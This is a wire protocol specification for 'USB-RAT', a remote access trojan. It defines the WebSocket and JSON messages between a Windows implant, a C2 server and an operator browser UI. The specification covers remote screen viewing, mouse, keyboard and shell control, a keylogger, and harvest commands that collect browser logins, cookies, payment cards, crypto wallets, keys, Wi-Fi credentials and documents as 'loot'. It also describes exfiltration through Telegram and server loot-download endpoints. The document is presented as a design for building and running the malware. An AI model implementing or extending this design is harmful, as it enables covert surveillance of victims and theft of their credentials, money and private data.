# USB-RAT wire protocol

Three parties: **implant** (Windows agent) ⇄ **server** (Rust/axum) ⇄ **operator UI** (browser).

Transport: WebSocket. Two kinds of frames exist everywhere:

- **Text** = JSON control messages (UTF‑8).
- **Binary** = raw payload stream, tagged with a 1‑byte type prefix.

## 1. Server HTTP endpoints

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/` | operator UI (static files from `server/web`) |
| `GET` | `/api/sessions` | JSON list of live sessions (see §5) |
| `WS`  | `/ws/implant` | implant connects here |
| `WS`  | `/ws/op/{session_id}` | operator attaches to one session |

Auth (optional): if env `C2_TOKEN` is set, every HTTP/WS request must carry
`?token=<C2_TOKEN>` or header `Authorization: Bearer <C2_TOKEN>`. If unset, no auth (lab mode).

## 2. Binary frame types (first byte)

| Byte | Direction | Layout |
|---|---|---|
| `0x01` | implant → server → op | `[0x01][JPEG bytes]` — one full screen frame |
| `0x02` | server → implant | `[0x02][path utf8]` request a file (reserved) |
| `0x03` | implant → server | `[0x03][name_len u16 LE][name utf8][file bytes]` — one loot file. The server persists it under `LOOT_DIR/<session>/<name>` and does **not** forward it to operators; they download it over HTTP (§7). |

## 3. Implant → Server (text JSON)

Identity, sent once on connect:
```json
{"t":"hello","id":"<uuid>","host":"DESKTOP-01","user":"alice","os":"Windows 10","arch":"x64","pid":4120,"admin":false,"screen":[1920,1080]}
```

Periodic:
```json
{"t":"pong","id":7}
```

Command output:
```json
{"t":"cmd_result","id":"3f2a","out":"<stdout+stderr>"}
```

Optional telemetry:
```json
{"t":"stats","fps":8.1,"kbps":420,"uptime":1234}
```

Harvest lifecycle (in response to `{"t":"harvest"}`):
```json
{"t":"harvest_ack","id":"a1b2"}
{"t":"loot_meta","id":"a1b2","name":"browsers/chrome__Default__logins.txt","kind":"creds","size":812,"sha256":"…"}
{"t":"harvest_done","id":"a1b2","count":17,"bytes":284113}
```
Each `loot_meta` is immediately followed by the matching binary `0x03` frame.
`kind` is one of `env|browser|creds|cookies|cards|history|wallet|keys|document|wifi|clipboard|custom`.

**Telegram build.** If the implant was built with `TG_TOKEN`, it does not use
this WebSocket protocol at all: `tg_c2.rs` long-polls Telegram for commands and
uploads loot with `sendDocument` (see the README's Telegram section). This
document describes the non-Telegram build. The `harvest::run` Telegram branch
(no `0x03`, `harvest_done` with `"via":"telegram"`) only applies if a WS C2 is
wired manually alongside a Telegram build.

Keylogger (in response to `{"t":"keylog"}`):
```json
{"t":"keylog_state","on":true}
{"t":"keys","text":"typed characters since the last flush\n"}
```
`keys` is flushed every ~3 s and follows the live socket across reconnects.

Binary `0x01` frames are sent continuously at the configured FPS.

## 4. Server → Implant (text JSON)

Mouse (coords normalised 0.0–1.0 of the implant screen; server passes through):
```json
{"t":"mouse","x":0.512,"y":0.333,"btn":"left|right|middle","act":"down|up|move"}
```
- `move` has no `btn`.

Keyboard (Windows virtual-key code, not JS key code):
```json
{"t":"key","vk":65,"down":true,"mods":["shift","ctrl","alt"]}
```
`mods` are applied around the key press; omit or `[]` for none.

Shell:
```json
{"t":"cmd","id":"3f2a","line":"whoami /all"}
```

Stream tuning:
```json
{"t":"set","fps":8,"quality":45,"scale":0.5}
```
- `fps` 1–15, `quality` 20–80 (JPEG), `scale` 0.3–1.0 of native resolution.

Ping:
```json
{"t":"ping","id":7}
```

Harvest (data collection):
```json
{"t":"harvest","id":"a1b2","collectors":["env","browsers","wallets","keys","documents","wifi","clipboard"],"paths":["C:\\Users\\alice\\Desktop"]}
```
- `collectors` omitted/empty = all collectors.
- `paths` is an optional list of extra files/dirs to grab.
- Collector names: `env`, `browsers`, `wallets`, `keys`, `documents`, `wifi`, `clipboard`.

Keylogger:
```json
{"t":"keylog","on":true}
```
The implant replies `{"t":"keylog_state","on":true}` and then streams `keys` frames.

## 5. Session list (`GET /api/sessions`)

```json
[
  {
    "id": "b1c2...",
    "host": "DESKTOP-01",
    "user": "alice",
    "os": "Windows 10",
    "arch": "x64",
    "admin": false,
    "screen": [1920,1080],
    "last_seen": 1730000000,
    "online": true
  }
]
```

## 6. Operator UI ⇄ Server

The operator WS (`/ws/op/{id}`) is a transparent relay of the exact same
implant↔server vocabulary, in both directions:

- Server → op: text control JSON (§3) **and** binary `0x01` screen frames.
- Op → server: text control JSON (§4) exactly as if it were the operator.
- Control frames from the op are forwarded to the implant; `set`/`cmd`/`mouse`/`key` all work this way.

### Coordinate mapping in the browser
The UI renders a `0x01` JPEG into a `<canvas>`. On mouse events it converts
`offsetX / canvas.clientWidth` and `offsetY / canvas.clientHeight` to 0..1
and sends `{"t":"mouse",...}`. It maps `KeyboardEvent.code`/`key` to a
Windows VK code before sending `{"t":"key",...}` (see `web/vk.js`).

### Reconnect
If the op socket closes, the UI retries `/ws/op/{id}` every 2s. If the
session disappears from `/api/sessions`, the UI shows it offline and stops.

## 7. Loot HTTP endpoints

Files arriving as `0x03` frames are stored on the server under
`$LOOT_DIR/<session_id>/<name>` (default `./loot`). `name` is sanitized:
traversal (`..`), absolute components, drive letters and control characters are
stripped, and depth is capped. Operators fetch loot over authenticated HTTP,
not over the WS relay.

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/api/loot/{session_id}` | JSON list of `{name,size,mtime}` for that session |
| `GET` | `/api/loot/{session_id}/{name...}` | download one file (attachment) |

Both require the same `?token=` / `Authorization: Bearer` auth as every other
endpoint. `name` may contain `/` (nested collector paths); each component is
re-sanitized server-side.
